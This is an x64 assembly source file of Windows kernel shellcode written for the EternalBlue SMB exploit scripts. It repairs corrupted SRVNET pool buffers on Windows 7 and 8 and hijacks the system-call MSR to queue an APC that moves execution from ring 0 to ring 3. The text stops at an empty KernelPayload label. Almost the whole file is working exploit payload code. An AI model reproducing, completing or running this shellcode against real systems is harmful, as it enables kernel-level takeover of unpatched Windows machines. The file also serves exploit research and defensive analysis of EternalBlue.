;
; Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya
; The shellcode is written for eternalblue exploit: eternalblue_exploit7.py and eternalblue_exploit8.py
;
;
; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
;
;
; Note:
; - The userland shellcode is run in a new thread of system process.
;     If userland shellcode causes any exception, the system process get killed.
; - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
;     get call because system call is called on other processors.
; - The shellcode do not allocate shadow stack if possible for minimal shellcode size.
;     It is ok because some Windows function does not require shadow stack.
; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
; - The userland payload MUST be appened to this shellcode.
;
; Reference:
; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

BITS 64

DATA_PEB_ADDR_OFFSET        EQU -0x10
DATA_QUEUEING_KAPC_OFFSET   EQU -0x8
DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
DATA_NT_KERNEL_ADDR_OFFSET  EQU 0x8
DATA_KAPC_OFFSET            EQU 0x10

global shellcode_start

segment .text

shellcode_start:
setup_syscall_hook:
    ; IRQL is DISPATCH_LEVEL when got code execution

%ifdef WIN7
    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [rdx+0x2c]
    mov [rdx+0x38], ecx
%elifdef WIN8
    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
    ; fix pool pointer (rcx is -0x8150 from controlled argument value)
    add rcx, rdx
    mov [rdx+0x30], rcx
    ; set nByteProcessed to free corrupted buffer after return
    mov ecx, [rdx+0x48]
    mov [rdx+0x40], ecx
%endif
    
    push rbp
    
    call set_rbp_data_address_fn
    
    ; read current syscall
    mov ecx, 0xc0000082
    rdmsr
    ; do NOT replace saved original syscall address with hook syscall
    lea r9, [rel syscall_hook]
    cmp eax, r9d
    je _setup_syscall_hook_done
    
    ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize
    cmp dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    je _hook_syscall
    
    ; save original syscall
    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4], edx
    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
    
    ; first time on the target
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], 0

_hook_syscall:
    ; set a new syscall on running processor
    ; setting MSR 0xc0000082 affects only running processor
    xchg r9, rax
    push rax
    pop rdx     ; mov rdx, rax
    shr rdx, 32
    wrmsr
    
_setup_syscall_hook_done:
    pop rbp
    
%ifdef WIN7
    xor eax, eax
%elifdef WIN8
    xor eax, eax
%endif
    ret

;========================================================================
; Find memory address in HAL heap for using as data area
; Return: rbp = data address
;========================================================================
set_rbp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]
_set_rbp_data_address_fn_next:
    shr rbp, 12
    shl rbp, 12
    sub rbp, 0x70   ; for KAPC struct too
    ret


syscall_hook:
    swapgs
    mov qword [gs:0x10], rsp
    mov rsp, qword [gs:0x1a8]
    push 0x2b
    push qword [gs:0x10]
    
    push rax    ; want this stack space to store original syscall addr
    ; save rax first to make this function continue to real syscall
    push rax
    push rbp    ; save rbp here because rbp is special register for accessing this shellcode data
    call set_rbp_data_address_fn
    mov rax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
    add rax, 0x1f   ; adjust syscall entry, so we do not need to reverse start of syscall handler
    mov [rsp+0x10], rax

    ; save all volatile registers
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11
    
    ; use lock cmpxchg for queueing APC only one at a time
    xor eax, eax
    mov dl, 1
    lock cmpxchg byte [rbp+DATA_QUEUEING_KAPC_OFFSET], dl
    jnz _syscall_hook_done

    ;======================================
    ; restore syscall
    ;======================================
    ; an error after restoring syscall should never occur
    mov ecx, 0xc0000082
    mov eax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
    mov edx, [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4]
    wrmsr
    
    ; allow interrupts while executing shellcode
    sti
    call KernelPayload
    cli
    
_syscall_hook_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rbp
    pop rax
    ret

KernelPayload:
